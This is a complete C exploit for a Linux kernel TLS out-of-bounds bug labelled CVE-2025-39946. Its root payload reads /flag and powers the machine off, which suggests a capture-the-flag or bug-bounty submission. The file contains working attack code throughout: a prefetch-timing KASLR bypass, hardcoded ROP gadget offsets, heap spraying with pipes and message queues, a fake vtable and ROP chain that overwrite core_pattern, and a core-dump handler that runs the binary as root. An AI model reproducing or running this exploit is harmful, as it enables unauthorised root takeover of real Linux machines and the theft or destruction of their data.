/*
 * CVE-2025-39946 - TLS kernel OOB access exploit (LTS 6.12.46)
 *
 * Exploit chain overview:
 * 1. Trigger OOB access in tls_strp_copyin_frag() by sending MSG_OOB data
 *    combined with memory pressure. The TLS parser fails but doesn't abort the
 *    connection, causing skb->len to grow past the frags[] array bounds.
 * 2. Fill the uninitialized frags[] memory with stale page pointers from freed
 *    AIO pages (via io_setup/io_destroy + vsock zero-copy splice).
 * 3. Spray pipe_buffer objects (kmalloc-cg-192) to reclaim the freed AIO page.
 *    Uses msg_msgseg as padding to fill slab pages with pipe_buffer objects.
 * 4. Trigger the OOB write through TLS to overwrite the reclaimed pipe_buffer
 *    with a crafted payload that replaces pipe_buffer->ops with a fake vtable.
 * 5. Close pipes to trigger ops->release, executing a stack pivot + ROP chain
 *    that overwrites core_pattern via copy_from_user().
 * 6. A child process detects the core_pattern change, crashes itself, and the
 *    kernel core dump handler runs the exploit binary as root (via fd 666).
 */

#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <linux/tls.h>
#include <linux/vm_sockets.h>
#include <err.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define SYSCHK(x) ({              \
                typeof(x) __res = (x);        \
                if (__res == (typeof(x))-1)   \
                err(1, "SYSCHK(" #x ")"); \
                __res;                        \
                })

/* ========================================================================
 * Constants
 * ======================================================================== */

#define KERNEL_DEFAULT_BASE     0xffffffff81000000UL

/* TCP listener port for the TLS connection */
#define TCP_PORT                4444

/* Page size used for buffer alignment and slab calculations */
#define PAGE_SIZE               0x1000

/*
 * Number of AIO events requested via io_setup(). This is an arbitrary value
 * that causes the kernel to allocate pages for the AIO context ring buffer.
 * After io_destroy() frees these pages, they can be reclaimed by kmalloc
 * allocations, which is how we get stale page pointers into the frags[] area.
 */
#define AIO_NR_EVENTS           0x180

/*
 * Size of data sent via vsock zero-copy to splice AIO page references into skb
 * frags. This covers enough frags entries to populate the uninitialized region
 * that tls_strp_copyin_frag() will later read OOB from.
 */
#define VSOCK_ZEROCOPY_SIZE     0x50c0

/*
 * Number of message queues used as spray vehicles. Each queue receives a
 * msg_msgseg that lands in kmalloc-cg-192, filling slab pages so that
 * pipe_buffer allocations land on the target freed page.
 */
#define NUM_MSG_QUEUES          0x4000

/*
 * Number of pipes pre-allocated. Their pipe_buffer objects (kmalloc-cg-192)
 * will be expanded via F_SETPIPE_SZ to reclaim the freed AIO page.
 */
#define NUM_PIPES               0x600

/*
 * Size of each message sent to message queues. Calculated as:
 * 0x1000 (page) - 0x30 (msg_msg header) + 0xc0 (pipe_buffer size) - 8
 * This ensures the msg_msgseg continuation falls into kmalloc-cg-192,
 * the same slab cache as pipe_buffer.
 */
#define MSG_SPRAY_SIZE          (PAGE_SIZE - 0x30 + 0xc0 - 8)

/*
 * msg_msgseg objects per slab page before inserting a pipe_buffer.
 * With 21 msg_msgseg objects per slab page, we insert 2 pipe_buffer
 * allocations to ensure at least one pipe_buffer lands on each slab page.
 */
#define MSGS_PER_PIPE_ALLOC     21

/*
 * New pipe size passed to fcntl(F_SETPIPE_SZ). Increasing pipe size forces
 * the kernel to allocate new pipe_buffer arrays in kmalloc-cg-192.
 */
#define PIPE_EXPAND_SIZE        0x4000

/*
 * Receive buffer size set on the server socket. A small buffer (64KB) creates
 * memory pressure that forces TLS to copy data into its internal skb, which is
 * required to trigger the OOB frags access.
 */
#define RECV_BUF_SIZE           (1 << 16)

/*
 * Number of OOB sends used to trigger the TLS OOB frags write after pipe_buffer
 * reclaim. Each send causes tls_strp_copyin_frag() to index further OOB.
 */
#define NUM_OOB_TRIGGERS        3

/*
 * Number of pages worth of payload to fill with crafted pipe_buffer objects.
 * 6 pages of payload ensures broad coverage over the freed page.
 */
#define NUM_PAYLOAD_PAGES       6

/*
 * pipe_buffer struct layout offsets (kmalloc-cg-192):
 * struct pipe_buffer {
 *     struct page *page;       // +0x00
 *     unsigned int offset;     // +0x08
 *     unsigned int len;        // +0x0c
 *     const struct pipe_buf_operations *ops;  // +0x10
 *     unsigned int flags;      // +0x18
 *     unsigned long private;   // +0x20
 * };
 * Total size: 0x28 bytes, but allocated in 0xc0 (192) byte slab objects.
 */
#define PIPE_BUF_OPS_OFFSET     16      /* offset of ops pointer within pipe_buffer */
#define PIPE_BUF_PRIVATE_OFFSET 24      /* offset of private field within pipe_buffer */
#define PIPE_BUF_SLAB_SIZE      0xc0    /* kmalloc-cg-192 slab object size */

/*
 * Offset within each pipe_buffer-sized slot where the ROP chain starts.
 * Placed at +0x20 (the 'private' field area and beyond) to avoid clobbering
 * the ops pointer at +0x10.
 */
#define ROP_CHAIN_OFFSET        0x20

/*
 * Size of the core_pattern string to copy (0x30 = 48 bytes), enough for
 * "|/proc/%P/fd/666 %P" plus null padding.
 */
#define CORE_PATTERN_COPY_SIZE  0x30

/*
 * msleep duration (in ms) passed to msleep() in the ROP chain to keep the
 * kernel thread alive indefinitely after overwriting core_pattern.
 */
#define MSLEEP_DURATION         0x10000

/* File descriptor number used to pass the exploit binary to the core handler */
#define EXPLOIT_FD              666

/* ========================================================================
 * ROP gadgets (LTS 6.12.46, offsets from kernel text base)
 *
 * All addresses are expressed as (ktext + offset) where ktext is the
 * runtime kernel text base determined via KASLR bypass.
 * ======================================================================== */

size_t ktext;

/* push rdi ; jmp qword ptr [rbp + 0x48] */
#define PUSH_RDI_JMP            (ktext + 0x95e2d5)

/* pop rbx ; pop rsp ; ... (stack pivot target) */
#define POP_RBX_POP_RSP         (ktext + 0x15c2cf1)

/* push rdi ; call qword ptr [rdi] -- initial entry from fake ops->release */
#define PUSH_RDI_CALL_QRDI      (ktext + 0x145a3c5)

/* pop rsp ; ret */
#define POP_RSP_RET             (ktext + 0xa79ef6)

/* pop rdi ; pop rbx ; ret */
#define POP_RDI_POP_RBX_RET     (ktext + 0x193839)

/* pop rdi ; ret */
#define POP_RDI_RET             (ktext + 0xe03b)

/* pop rsi ; ret */
#define POP_RSI_RET             (ktext + 0x9e035)

/* pop rdx ; ret */
#define POP_RDX_RET             (ktext + 0x135e04b)

/* msleep() */
#define MSLEEP                  (ktext + 0x271d20)

/* copy_from_user() */
#define COPY_FROM_USER          (ktext + 0xb6ec40)

/* core_pattern global variable */
#define CORE_PATTERN            (ktext + 0x320e320)

/*
 * module_sysfs_ops (struct sysfs_ops) -- used as a fake pipe_buf_operations vtable.
 *
 * JOP trick: pipe_buf_release() calls buf->ops->release(pipe, buf), where
 * ->release is at vtable offset +8. By pointing ops to module_sysfs_ops,
 * the kernel calls module_sysfs_ops->store (also at offset +8), which is
 * module_attr_store(kobj, attr, buf, len). The 'attr' parameter (rsi) is
 * actually our pipe_buffer pointer (controlled data). module_attr_store then
 * calls attribute->store(attribute, ...) with rdi = attribute = our controlled
 * pipe_buffer. This lets us hijack control flow with rdi pointing to our data,
 * without needing to know any heap address.
 *
 * We place PUSH_RDI_CALL_QRDI at the attribute->store position in our fake
 * pipe_buffer, which pushes rdi (our buffer) and calls [rdi], landing on
 * POP_RBX_POP_RSP to pivot the stack into our ROP chain.
 */
#define MODULE_SYSFS_OPS        (ktext + 0x1a2f7f0)

/* Payload written to core_pattern to execute our binary as root */
const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";

/* Message buffer used for msg_msgseg spray */
struct spray_msg {
        long mtype;
        char mtext[0x2000];
};

/* ========================================================================
 * KASLR bypass (EntryBleed-style prefetch timing side-channel)
 * ======================================================================== */

// #define KASLR_BYPASS_INTEL

#ifdef KASLR_BYPASS_INTEL
/* Intel: scan 0xffffffff81000000 - 0xffffffffD0000000 in 16MB steps */
#define KASLR_SCAN_START        (KERNEL_DEFAULT_BASE)
#define KASLR_SCAN_END          (0xffffffffD0000000ull)
#define KASLR_SCAN_STEP         0x1000000ull
#define KASLR_NUM_VOTES         7
#else
/* AMD/generic: scan 0xffffffff81000000 - 0xffffffffc0000000 in 2MB steps */
#define KASLR_SCAN_START        (KERNEL_DEFAULT_BASE)
#define KASLR_SCAN_END          (0xffffffffc0000000ull)
#define KASLR_SCAN_STEP         0x200000ull
#define KASLR_NUM_VOTES         9
/*
 * Window size for sliding window analysis. We look for the largest contiguous
 * region of high prefetch latency (mapped kernel memory) across WINDOW_SIZE
 * consecutive scan steps. The start of this region is the kernel text base.
 */
#define KASLR_WINDOW_SIZE       11
#endif

/* Number of timing samples per address to find minimum latency */
#define KASLR_SAMPLES_PER_ADDR  16

/* ========================================================================
 * Helper functions
 * ======================================================================== */

void set_cpu(int cpu)
{
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(cpu, &mask);
        sched_setaffinity(0, sizeof(mask), &mask);
}

int vsock_bind(unsigned int cid, unsigned int port, int type)
{
        struct sockaddr_vm sa = {
                .svm_family = AF_VSOCK,
                .svm_cid = cid,
                .svm_port = port,
        };

        int fd = SYSCHK(socket(AF_VSOCK, type, 0));
        SYSCHK(bind(fd, (struct sockaddr *)&sa, sizeof(sa)));

        return fd;
}

int vsock_connect_fd(int fd, unsigned int cid, unsigned int port)
{
        struct sockaddr_vm sa = {
                .svm_family = AF_VSOCK,
                .svm_cid = cid,
                .svm_port = port,
        };
        int ret;

        do {
                ret = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
        } while (ret < 0 && errno == EINTR);

        return ret;
}

static int listen_vsockfd = -1;
static struct sockaddr_vm listen_vsock_addr;

void vsock_pair(int fd[2])
{
        if (listen_vsockfd == -1) {
                int lfd = vsock_bind(VMADDR_CID_ANY, VMADDR_PORT_ANY, SOCK_STREAM);
                SYSCHK(listen(lfd, 1));
                socklen_t alen = sizeof(listen_vsock_addr);
                SYSCHK(getsockname(lfd, (struct sockaddr *)&listen_vsock_addr, &alen));
                listen_vsockfd = lfd;
        }
        int flag = 1;
        int client = SYSCHK(socket(AF_VSOCK, SOCK_STREAM, 0));
        SYSCHK(setsockopt(client, SOL_SOCKET, SO_ZEROCOPY, &flag, sizeof(flag)));
        vsock_connect_fd(client, listen_vsock_addr.svm_cid, listen_vsock_addr.svm_port);
        int serv = SYSCHK(accept(listen_vsockfd, 0, 0));
        fd[0] = client;
        fd[1] = serv;
}

void setup_tls(int sock)
{
        struct tls12_crypto_info_aes_ccm_128 crypto = {0};
        crypto.info.version = TLS_1_3_VERSION;
        crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;

        memset(crypto.iv, 0x0, TLS_CIPHER_AES_CCM_128_IV_SIZE);
        memset(crypto.rec_seq, 0x0, TLS_CIPHER_AES_CCM_128_REC_SEQ_SIZE);
        memset(crypto.key, 0x0, TLS_CIPHER_AES_CCM_128_KEY_SIZE);
        memset(crypto.salt, 0x0, TLS_CIPHER_AES_CCM_128_SALT_SIZE);

        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0) {
                perror("setsockopt TCP_ULP");
                exit(1);
        }
        if (setsockopt(sock, SOL_TLS, TLS_TX, &crypto, sizeof(crypto)) < 0) {
                perror("setsockopt TLS_TX");
                exit(1);
        }
        if (setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)) < 0) {
                perror("setsockopt TLS_RX");
                exit(1);
        }
}

int check_core_pattern(void)
{
        char core_buf[0x100] = {};
        int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
        read(core, core_buf, sizeof(core_buf));
        close(core);
        return strncmp(core_buf, "|/proc/%P/fd/666", 0x10) == 0;
}

/* ========================================================================
 * Root payload - executed by the kernel core dump handler as root
 * ======================================================================== */

void root_payload(int parent_pid)
{
        int pfd = syscall(SYS_pidfd_open, parent_pid, 0);
        int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
        int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
        int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
        dup2(stdinfd, 0);
        dup2(stdoutfd, 1);
        dup2(stderrfd, 2);
        /* Read the flag and power off so the PR verification workflow can
         * proceed to the next attempt quickly */
        system("cat /flag");
        // @sleep(desc="Wait for flag output to flush before triggering poweroff")
        sleep(1);
        system("cat /flag;echo o>/proc/sysrq-trigger");
        exit(0);
}

/* ========================================================================
 * Core pattern crash monitor - runs in child process, waits for
 * core_pattern overwrite, then crashes to trigger root payload execution.
 * ======================================================================== */

void wait_and_crash(void)
{
        int memfd = memfd_create("", 0);
        SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
        dup2(memfd, EXPLOIT_FD);
        close(memfd);

        while (check_core_pattern() == 0)
                // @sleep(desc="Poll core_pattern every second until ROP overwrites it")
                sleep(1);

        puts("[+] core_pattern overwritten, triggering crash");
        *(size_t *)0 = 0;
}

/* ========================================================================
 * Set up TCP connection, send stale AIO page refs, enable TLS
 *
 * The ordering is critical for correct slab placement:
 * 1. vsock_pair + io_setup must happen before msg queue / pipe allocation
 *    (already done in main before this function is called)
 * 2. Create TCP listener + client socket, connect client
 * 3. Send AIO page refs via vsock zero-copy (after TCP connect)
 * 4. Enable TLS TX+RX on the client socket
 * 5. Accept on server side, configure memory pressure
 * ======================================================================== */

void setup_connection_and_send_frags(int vsock_fd[2], char *puaf,
                                     int *client_out, int *conn_out)
{
        struct sockaddr_in addr = {0};
        int listener, client, conn;
        char recv_buf[VSOCK_ZEROCOPY_SIZE];

        /* Create TCP listener and connect client */
        listener = socket(AF_INET, SOCK_STREAM, 0);
        if (listener < 0) {
                perror("socket listener");
                exit(1);
        }

        addr.sin_family = AF_INET;
        addr.sin_port = htons(TCP_PORT);
        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        int optval = 1;
        SYSCHK(setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)));
        SYSCHK(bind(listener, (struct sockaddr *)&addr, sizeof(addr)));
        SYSCHK(listen(listener, 1));
        client = SYSCHK(socket(AF_INET, SOCK_STREAM, 0));
        SYSCHK(connect(client, (struct sockaddr *)&addr, sizeof(addr)));

        /* Send AIO page refs via vsock zero-copy. This must happen after TCP
         * connect but before TLS setup, so the vsock skb frags containing
         * stale page pointers land in the right slab region. */
        send(vsock_fd[0], puaf + PAGE_SIZE, VSOCK_ZEROCOPY_SIZE, MSG_ZEROCOPY);
        SYSCHK(read(vsock_fd[1], recv_buf, VSOCK_ZEROCOPY_SIZE));

        /* Enable TLS on the client socket */
        setup_tls(client);
        printf("[*] Client connected to server\n");

        /* Accept on server side and configure memory pressure */
        conn = SYSCHK(accept(listener, NULL, 0));
        printf("[*] Server accepted connection\n");

        int flag = 1;
        if (setsockopt(conn, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag)) < 0) {
                perror("setsockopt TCP_NODELAY");
                exit(1);
        }

        int rcvbuf = RECV_BUF_SIZE;
        SYSCHK(setsockopt(conn, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)));

        close(listener);

        *client_out = client;
        *conn_out = conn;
}

/* ========================================================================
 * Step 3: Build and send the crafted pipe_buffer payload
 *
 * Fills a buffer with repeating crafted pipe_buffer structures. Each
 * PIPE_BUF_SLAB_SIZE (0xc0) slot contains:
 * - At +0x00: POP_RBX_POP_RSP address (stack pivot landing pad)
 * - At +0x10 (ops): MODULE_SYSFS_OPS (fake pipe_buf_operations vtable)
 * - At +0x18: PUSH_RDI_CALL_QRDI (attribute->store in JOP chain)
 * - At +0x20+: ROP chain that overwrites core_pattern and sleeps forever
 *
 * JOP execution flow when pipe is closed:
 *   pipe_buf_release(pipe, buf)
 *   -> buf->ops->release(pipe, buf)          [ops = MODULE_SYSFS_OPS]
 *   -> module_sysfs_ops.store(kobj, attr=buf, ...)  [offset +8 = .store]
 *   -> module_attr_store(kobj, attr, buf, len)
 *   -> attribute->store(attr, ...)           [attr = our pipe_buffer, rdi = attr]
 *   -> PUSH_RDI_CALL_QRDI(pipe_buffer)      [slot+0x18, pushes rdi, calls [rdi]]
 *   -> POP_RBX_POP_RSP                      [slot+0x00, pivots stack to slot+0x20]
 *   -> ROP chain executes
 *
 * Then sends the OOB trigger followed by the payload through the TLS
 * connection. The OOB data causes TLS header parsing to fail, and the
 * subsequent large send fills the OOB frags with our payload.
 * ======================================================================== */

void build_and_send_payload(int conn)
{
        char payload[1 << 16];

        memset(payload, '\xff', sizeof(payload));
        /* Initial OOB send: triggers TLS parse failure without closing connection */
        send(conn, payload, 5, MSG_OOB);

        for (int page_idx = 0; page_idx < NUM_PAYLOAD_PAGES; page_idx++) {
                char *page_start = payload + page_idx * PAGE_SIZE;
                memset(page_start, 'A' + page_idx, PAGE_SIZE);

                for (char *slot = page_start;
                     slot < page_start + PAGE_SIZE;
                     slot += PIPE_BUF_SLAB_SIZE) {
                        /*
                         * Craft fake pipe_buffer at this slot:
                         * [+0x00] = POP_RBX_POP_RSP  (stack pivot: popped by PUSH_RDI_CALL_QRDI)
                         * [+0x10] = MODULE_SYSFS_OPS  (fake pipe_buf_operations pointer)
                         * [+0x18] = PUSH_RDI_CALL_QRDI (ops->release entry point)
                         * [+0x20] = ROP chain start
                         */
                        *(size_t *)(slot) = POP_RBX_POP_RSP;
                        *(size_t *)(slot + PIPE_BUF_OPS_OFFSET) = MODULE_SYSFS_OPS;
                        *(size_t *)(slot + PIPE_BUF_PRIVATE_OFFSET) = PUSH_RDI_CALL_QRDI;

                        /* Build ROP chain starting after the pipe_buffer header */
                        size_t *rop = (void *)(slot + ROP_CHAIN_OFFSET);
                        *rop++ = POP_RDI_RET;
                        *rop++ = CORE_PATTERN;          /* rdi = &core_pattern */
                        *rop++ = POP_RSI_RET;
                        *rop++ = (size_t)&fake_core_pattern; /* rsi = src string */
                        *rop++ = POP_RDX_RET;
                        *rop++ = CORE_PATTERN_COPY_SIZE; /* rdx = length */
                        *rop++ = COPY_FROM_USER;        /* copy_from_user(core_pattern, src, len) */
                        *rop++ = POP_RDI_RET;
                        *rop++ = MSLEEP_DURATION;       /* rdi = sleep duration ms */
                        *rop++ = MSLEEP;                /* msleep() to keep thread alive */
                }
        }
        send(conn, payload, sizeof(payload), 0);
}

/* ========================================================================
 * Step 4: Spray pipe_buffer objects to reclaim the freed page
 *
 * Sends msg_msgseg objects to fill slab pages, interleaving pipe_buffer
 * allocations (via F_SETPIPE_SZ) to ensure pipe_buffer lands on the
 * target freed page. Then frees the msg_msgseg objects.
 * ======================================================================== */

void spray_and_reclaim(int msqid[], int pfds[][2], struct spray_msg *spray_msg)
{
        int pipe_idx = 0;

        for (int i = 0; i < NUM_MSG_QUEUES; i++) {
                msgsnd(msqid[i], spray_msg, MSG_SPRAY_SIZE, 0);
                if ((i % MSGS_PER_PIPE_ALLOC) == 0) {
                        fcntl(pfds[pipe_idx++][1], F_SETPIPE_SZ, PIPE_EXPAND_SIZE);
                        fcntl(pfds[pipe_idx++][1], F_SETPIPE_SZ, PIPE_EXPAND_SIZE);
                }
        }

        for (int i = 0; i < NUM_MSG_QUEUES; i++) {
                SYSCHK(msgrcv(msqid[i], spray_msg, MSG_SPRAY_SIZE, 0, IPC_NOWAIT));
        }
}

/* ========================================================================
 * Step 5: Trigger OOB write and close pipes
 *
 * Sends additional MSG_OOB data to make TLS write to the OOB frags (now
 * pointing to the freed page reclaimed by pipe_buffer), then closes all
 * pipes to trigger the corrupted ops->release -> ROP chain.
 * ======================================================================== */

void trigger_and_release(int conn, int pfds[][2])
{
        char oob_buf[5] = {0};

        for (int i = 0; i < NUM_OOB_TRIGGERS; i++) {
                printf("[*] OOB trigger %d\n", i);
                send(conn, oob_buf, 5, MSG_OOB);
        }

        for (int i = 0; i < NUM_PIPES; i++) {
                close(pfds[i][0]);
                close(pfds[i][1]);
        }
}

/* ========================================================================
 * KASLR bypass via EntryBleed-style prefetch timing side-channel
 * ======================================================================== */

inline __attribute__((always_inline)) uint64_t rdtsc_begin(void)
{
        uint64_t a, d;
        asm volatile ("mfence\n\t"
                        "RDTSCP\n\t"
                        "mov %%rdx, %0\n\t"
                        "mov %%rax, %1\n\t"
                        "xor %%rax, %%rax\n\t"
                        "lfence\n\t"
                        : "=r" (d), "=r" (a)
                        :
                        : "%rax", "%rbx", "%rcx", "%rdx");
        a = (d << 32) | a;
        return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end(void)
{
        uint64_t a, d;
        asm volatile(
                        "xor %%rax, %%rax\n\t"
                        "lfence\n\t"
                        "RDTSCP\n\t"
                        "mov %%rdx, %0\n\t"
                        "mov %%rax, %1\n\t"
                        "mfence\n\t"
                        : "=r" (d), "=r" (a)
                        :
                        : "%rax", "%rbx", "%rcx", "%rdx");
        a = (d << 32) | a;
        return a;
}

void prefetch_addr(void *addr)
{
        asm volatile (
                        "prefetchnta (%0)\n"
                        "prefetcht2 (%0)\n"
                        : : "r" (addr));
}

size_t measure_prefetch_time(void *addr)
{
        size_t time = rdtsc_begin();
        prefetch_addr(addr);
        size_t delta = rdtsc_end() - time;
        return delta;
}

size_t bypass_kaslr(void)
{
        u64 base = 0;

#define NUM_SCAN_ENTRIES ((KASLR_SCAN_END - KASLR_SCAN_START) / KASLR_SCAN_STEP)

        while (1) {
                u64 vote_results[KASLR_NUM_VOTES] = {0};

                for (int vote = 0; vote < KASLR_NUM_VOTES; vote++) {
                        size_t times[NUM_SCAN_ENTRIES] = {};
                        uint64_t scan_addrs[NUM_SCAN_ENTRIES];

                        for (int idx = 0; idx < NUM_SCAN_ENTRIES; idx++) {
                                times[idx] = ~0UL;
                                scan_addrs[idx] = KASLR_SCAN_START + KASLR_SCAN_STEP * (u64)idx;
                        }

                        for (int sample = 0; sample < KASLR_SAMPLES_PER_ADDR; sample++) {
                                for (int idx = 0; idx < NUM_SCAN_ENTRIES; idx++) {
                                        size_t elapsed = measure_prefetch_time((void *)scan_addrs[idx]);
                                        if (elapsed < times[idx])
                                                times[idx] = elapsed;
                                }
                        }

#ifdef KASLR_BYPASS_INTEL
                        /* Intel: find address with minimum prefetch latency (mapped page) */
                        size_t min_time = ~0UL;
                        int min_idx = -1;
                        for (int idx = 0; idx < NUM_SCAN_ENTRIES - 1; idx++) {
                                if (times[idx] < min_time) {
                                        min_idx = idx;
                                        min_time = times[idx];
                                }
                        }
                        if (min_idx < 0)
                                continue;
                        vote_results[vote] = scan_addrs[min_idx];
#else
                        /* AMD/generic: find start of largest contiguous high-latency region.
                         * Mapped kernel memory shows higher prefetch latency than unmapped
                         * regions, so we look for the window with maximum total latency. */
                        uint64_t max_sum = 0;
                        int max_start = 0;
                        for (int idx = 0; idx < NUM_SCAN_ENTRIES - KASLR_WINDOW_SIZE; idx++) {
                                uint64_t sum = 0;
                                for (int w = 0; w < KASLR_WINDOW_SIZE; w++)
                                        sum += times[idx + w];
                                if (sum > max_sum) {
                                        max_sum = sum;
                                        max_start = idx;
                                }
                        }
                        vote_results[vote] = scan_addrs[max_start];
#endif
                }

                /* Boyer-Moore majority vote to find consensus base address */
                int count = 0;
                for (int i = 0; i < KASLR_NUM_VOTES; i++) {
                        if (count == 0)
                                base = vote_results[i];
                        else if (base == vote_results[i])
                                count++;
                        else
                                count--;
                }

                count = 0;
                for (int i = 0; i < KASLR_NUM_VOTES; i++) {
                        if (base == vote_results[i])
                                count++;
                }
                if (count > KASLR_NUM_VOTES / 2) {
                        printf("[+] KASLR bypass: kernel base = %llx\n", (unsigned long long)base);
                        return base;
                }

                printf("[-] majority vote failed: base = %llx with %d/%d votes\n",
                       (unsigned long long)base, count, KASLR_NUM_VOTES);
        }
}

/* ========================================================================
 * Main exploit orchestration
 * ======================================================================== */

int main(int argc, char **argv)
{
        struct rlimit rlim = {
                .rlim_cur = 0x1000,
                .rlim_max = 0x1000,
        };
        SYSCHK(setrlimit(RLIMIT_NOFILE, &rlim));

        /* If invoked with an argument, we are the root payload triggered
         * by the core dump handler */
        if (argc > 1) {
                int parent_pid = strtoull(argv[1], 0, 10);
                root_payload(parent_pid);
        }

        /* Step 0: Fork a child that monitors core_pattern and crashes itself
         * when the ROP chain has overwritten it */
        if (fork() == 0) {
                set_cpu(1);
                setsid();
                wait_and_crash();
        }

        /* Step 1: Bypass KASLR to determine kernel text base */
        ktext = bypass_kaslr();

        /* Retry loop: if the exploit attempt fails (child exits), the parent
         * waits and retries with a new fork */
        while (1) {
                if (fork()) {
                        wait(NULL);
                        // @sleep(desc="Wait before retrying exploit attempt after child failure")
                        sleep(5);
                        continue;
                }
                break;
        }

        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
        set_cpu(0);

        int pfds[NUM_PIPES][2];
        static int msqid[NUM_MSG_QUEUES];
        struct spray_msg spray_msg;

        /* Step 2: Create vsock pair and allocate AIO pages (must be before
         * msg queue/pipe allocation for correct slab ordering) */
        int vsock_fd[2];
        vsock_pair(vsock_fd);
        char *puaf = NULL;
        SYSCHK(syscall(SYS_io_setup, AIO_NR_EVENTS, (size_t *)&puaf));

        /* Step 3: Allocate message queues for slab spray */
        system("ipcrm --all=msg");
        for (int i = 0; i < NUM_MSG_QUEUES; i++)
                msqid[i] = SYSCHK(msgget(IPC_PRIVATE, 0644 | IPC_CREAT));
        spray_msg.mtype = 1;
        memset(spray_msg.mtext, 'a', sizeof(spray_msg.mtext));

        /* Step 4: Pre-allocate pipes (their pipe_buffer will be expanded later) */
        char pipe_fill[1];
        for (int i = 0; i < NUM_PIPES; i++) {
                SYSCHK(pipe(pfds[i]));
                SYSCHK(write(pfds[i][1], pipe_fill, 1));
        }

        /* Step 5: Set up TCP connection, send AIO page refs via vsock
         * zero-copy, enable TLS, accept with memory pressure */
        int client, conn;
        setup_connection_and_send_frags(vsock_fd, puaf, &client, &conn);

        /* Step 6: Build and send crafted pipe_buffer payload through TLS */
        build_and_send_payload(conn);

        /* Step 7: Free the AIO pages so the stale frags point to freed memory */
        SYSCHK(syscall(SYS_io_destroy, puaf));
        // @sleep(desc="Wait for AIO pages to be fully freed before reclaiming")
        sleep(1);

        /* Step 8: Spray pipe_buffer to reclaim the freed page */
        spray_and_reclaim(msqid, pfds, &spray_msg);

        /* Step 9: Trigger OOB write and release pipes to execute ROP */
        trigger_and_release(conn, pfds);

        return 0;
}
